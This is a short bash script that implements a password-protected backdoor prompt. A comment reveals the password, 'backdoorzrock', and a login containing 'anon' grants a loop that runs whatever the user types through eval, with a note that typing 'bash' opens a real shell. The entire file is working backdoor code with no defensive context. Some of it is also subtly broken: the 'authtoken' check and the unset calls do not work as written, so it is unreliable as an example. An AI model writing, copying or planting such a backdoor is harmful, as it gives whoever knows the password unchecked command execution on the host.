#!/bin/bash
hash="a396572be01a534f1b6f9284ec20907dc9aede7e" #  printf backdoorzrock|sha1sum
lolnode=/tmp/.rofl



killenv(){ # since we rely on enviromental variables for auth, unset them
unset $l00s3rshame
unset $magic
}


while true
do
  nn=3
  while [[ $nn != "0" ]]; do
    killenv
    set +a
    printf "Login";read -r -p ": " l00s3rshame
    if printf "$l00s3rshame\n"| grep -q 'anon'; then
      printf "Password "
      IFS= read -r -s -p " : " magic && \
      if [[ $(printf "$magic"|sha1sum) == "$hash  -" ]];then
        printf "Access Granted!\n"
        set authtoken="true" # another layer of security (I think)
        while true;do
        if $authtoken;then
          printf '$ ' # emulate an interactive shell
          read cmd # just type bash for a real shell
          eval "$cmd"
        fi
        done
        unset $authtoken
        killenv
      else
      
     
        printf "Unauthorized!\n"
        sleep 1
        (( nn -= 1 ))
  fi

else
  printf "Unauthorized!\n\n"
  (( nn -= 1 ))
  sleep 1
fi

done

printf "Too many authentication failures. Wait.\n"
sleep 30
done
